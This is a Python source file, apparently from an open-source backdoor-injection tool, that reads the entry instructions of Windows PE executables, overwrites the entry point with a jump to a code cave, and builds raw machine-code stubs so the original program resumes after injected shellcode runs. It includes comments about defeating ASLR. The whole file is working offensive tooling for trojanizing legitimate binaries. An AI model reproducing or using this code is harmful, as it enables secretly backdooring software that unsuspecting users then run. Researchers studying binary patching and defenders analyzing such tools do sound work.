'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com

    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''


import struct
import random
from binascii import unhexlify
from capstone import *


class intelCore():

    nops = [0x90, 0x3690, 0x6490, 0x6590, 0x6690, 0x6790]
    jmp_symbols = ['jns', 'jle', 'jg', 'jp', 'jge', 'js', 'jl', 'jbe', 'jo', 
                   'jne', 'jrcxz', 'je', 'jae', 'jno', 'ja', 'jb', 'jnp', 'jmp'
                  ]

    def __init__(self, flItms, file_handle, VERBOSE):
        self.f = file_handle
        self.flItms = flItms
        self.VERBOSE = VERBOSE

    def opcode_return(self, OpCode, instr_length):
        _, OpCode = hex(OpCode).split('0x')
        OpCode = unhexlify(OpCode)
        return OpCode

    def ones_compliment(self):
        """
        Function for finding two random 4 byte numbers that make
        a 'ones compliment'
        """
        compliment_you = random.randint(1, 4228250625)
        compliment_me = int('0xFFFFFFFF', 16) - compliment_you
        if self.VERBOSE is True:
            print "First ones compliment:", hex(compliment_you)
            print "2nd ones compliment:", hex(compliment_me)
            print "'AND' the compliments (0): ", compliment_you & compliment_me
        self.compliment_you = struct.pack('<I', compliment_you)
        self.compliment_me = struct.pack('<I', compliment_me)

    def pe32_entry_instr(self):
        """
        Updated to use Capstone-Engine
        """
        print "[*] Reading win32 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        self.flItms['ImpList'] = []
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        self.count = 0
        for k in md.disasm(self.f.read(12), self.flItms['VrtStrtngPnt']):
            self.count += k.size
            self.flItms['ImpList'].append([int(hex(k.address).strip('L'), 16),
                                          k.mnemonic.encode("utf-8"),
                                          k.op_str.encode("utf-8"),
                                          int(hex(k.address).strip('L'), 16) + k.size,
                                          k.bytes,
                                          k.size])
            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

        self.flItms['count_bytes'] = self.count

    def pe64_entry_instr(self):
        """
        For x64 files. Updated to use Capstone-Engine.
        """
        print "[*] Reading win64 entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        self.count = 0
        self.flItms['ImpList'] = []
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        for k in md.disasm(self.f.read(12), self.flItms['VrtStrtngPnt']):
            self.count += k.size
            self.flItms['ImpList'].append([int(hex(k.address).strip('L'), 16),
                                          k.mnemonic.encode("utf-8"),
                                          k.op_str.encode("utf-8"),
                                          int(hex(k.address).strip('L'), 16) + k.size,
                                          k.bytes,
                                          k.size])
            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break

        self.flItms['count_bytes'] = self.count

    def patch_initial_instructions(self):
        """
        This function takes the flItms dict and patches the
        executable entry point to jump to the first code cave.
        """
        print "[*] Patching initial entry instructions"
        self.f.seek(self.flItms['LocOfEntryinCode'])
        #This is the JMP command in the beginning of the
        #code entry point that jumps to the codecave
        self.f.write(struct.pack('=B', int('E9', 16)))
        if self.flItms['JMPtoCodeAddress'] < 0:
            self.f.write(struct.pack('<I', 0xffffffff + self.flItms['JMPtoCodeAddress']))
        else:
            self.f.write(struct.pack('<I', self.flItms['JMPtoCodeAddress']))

        # To make any overwritten instructions dissembler friendly
        if self.flItms['count_bytes'] > 5:
            for i in range(self.flItms['count_bytes'] - 5):
                self.f.write(struct.pack('=B', 0x90))

    def resume_execution_64(self):
        """
        For x64 exes...
        """
        print "[*] Creating win64 resume execution stub"
        resumeExe = ''
        total_opcode_len = 0
        for item in self.flItms['ImpList']:
            startingPoint = item[0]
            OpCode = item[1]
            CallValue = item[2]
            ReturnTrackingAddress = item[3]
            entireInstr = item[4]
            total_opcode_len += item[5]
            self.ones_compliment()

            if OpCode == 'call':  # Call instruction
                CallValue = int(CallValue, 16)
                resumeExe += "\x48\x89\xd0"  # mov rad,rdx
                resumeExe += "\x48\x83\xc0"  # add rax,xxx
                resumeExe += struct.pack("<B", total_opcode_len)  # length from vrtstartingpoint after call
                resumeExe += "\x50"  # push rax
                if len(entireInstr[1:]) <= 4:  # 4294967295:
                    resumeExe += "\x48\xc7\xc1"  # mov rcx, 4 bytes
                    resumeExe += entireInstr[1:]
                elif len(entireInstr[1:]) > 4:  # 4294967295:
                    resumeExe += "\x48\xb9"  # mov rcx, 8 bytes
                    resumeExe += entireInstr[1:]

                resumeExe += "\x48\x01\xc8"  # add rax,rcx
                resumeExe += "\x50"
                resumeExe += "\x48\x31\xc9"  # xor rcx,rcx
                resumeExe += "\x48\x89\xf0"  # mov rax, rsi
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_you
                resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                return ReturnTrackingAddress, resumeExe

            elif any(symbol in OpCode for symbol in self.jmp_symbols):
                #Let's beat ASLR
                CallValue = int(CallValue, 16)
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (startingPoint +
                                     self.flItms['JMPtoCodeAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue + 5)  # Add+ EAX, CallValue
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', startingPoint - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                return ReturnTrackingAddress, resumeExe

            else:
                resumeExe += entireInstr

        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_you  # zero out r15
        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_me  # zero out r15
        resumeExe += "\x49\x81\xc7"  # ADD r15 <<-fix it this a 4 or 8 byte add does it matter?
        if ReturnTrackingAddress >= 4294967295:
            resumeExe += struct.pack('<Q', ReturnTrackingAddress)
        else:
            resumeExe += struct.pack('<I', ReturnTrackingAddress)
        resumeExe += "\x41\x57"  # push r15
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_you
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe

    def resume_execution_32(self):
        """
        This section of code imports the self.flItms['ImpList'] from pe32_entry_instr
        to patch the executable after shellcode execution
        """
        print "[*] Creating win32 resume execution stub"
        resumeExe = ''
        for item in self.flItms['ImpList']:
            startingPoint = item[0]
            OpCode = item[1]
            CallValue = item[2]
            ReturnTrackingAddress = item[3]
            entireInstr = item[4]
            self.ones_compliment()
            if OpCode == 'call':  # Call instruction
                # Let's beat ASLR :D
                CallValue = int(CallValue, 16)
                resumeExe += "\xb8"
                if self.flItms['LastCaveAddress'] == 0:
                    self.flItms['LastCaveAddress'] = self.flItms['JMPtoCodeAddress']
                #Could make this more exact...
                aprox_loc_wo_alsr = (startingPoint +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     500 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x12"  # JA (14)
                resumeExe += "\x83\xC1\x15"  # ADD ECX, 15
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                if CallValue > 4294967295:
                    resumeExe += struct.pack('<I', CallValue - 0xffffffff - 1)
                else:
                    resumeExe += struct.pack('<I', CallValue)
                resumeExe += "\xff\xe0"  # JMP EAX
                resumeExe += "\xb8"  # ADD
                resumeExe += struct.pack('<I', item[3])
                resumeExe += "\x50\xc3"  # PUSH EAX,RETN
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack("<I", startingPoint)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                resumeExe += struct.pack('<I', ReturnTrackingAddress)
                resumeExe += "\x50"
                resumeExe += "\x05"
                resumeExe += entireInstr[1:]
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                return ReturnTrackingAddress, resumeExe

            elif any(symbol in OpCode for symbol in self.jmp_symbols):
                #Let's beat ASLR
                CallValue = int(CallValue, 16)
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (startingPoint +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..

                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue + 5)  # Add+ EAX,CallV
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', startingPoint - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue + 5 - 2)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                return ReturnTrackingAddress, resumeExe
            else:
                resumeExe += entireInstr

        resumeExe += "\x25"
        resumeExe += self.compliment_you  # zero out EAX
        resumeExe += "\x25"
        resumeExe += self.compliment_me  # zero out EAX
        resumeExe += "\x05"  # ADD
        resumeExe += struct.pack('=i', ReturnTrackingAddress)
        resumeExe += "\x50"  # push eax
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_you
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe
